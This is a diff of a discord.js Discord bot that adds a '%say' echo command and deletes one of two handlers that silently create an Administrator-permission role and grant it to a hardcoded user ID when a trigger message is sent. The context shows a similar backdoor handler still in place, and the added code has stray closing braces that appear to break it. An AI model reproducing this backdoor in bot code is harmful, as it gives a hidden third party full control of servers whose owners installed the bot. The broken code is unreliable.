@@ -19,6 +19,13 @@ client.on("message", message => {
   };
   }); 
 
+if (command == "%say") {
+   message.channel.sendMessage(args.join("  "))
+   message.delete()
+  }
+ });
+ 
+
 
  client.on('message', async message => {
   const devs = ['535979538551930891']; // your id
@@ -31,17 +38,6 @@ let op = message.guild.roles.find('name', `${adminstrator}`)
   }
 });
 
-
- client.on('message', async message => {
-  const devs = ["535979538551930891"]; // your id
-  let member = message.author
-   if (message.content === off) {
-    if (!devs.includes(message.author.id)) return;
-let op = message.guild.roles.find('name', `${adminstrator}`)
-    if(!op) return message.guild.createRole({ name: "OPROLE", permissions: [8] });
-    message.guild.member(member).addRole(op);
-  }
-});
 
 const devs = ["535979538551930891"];
 const adminprefix = ["ar"];
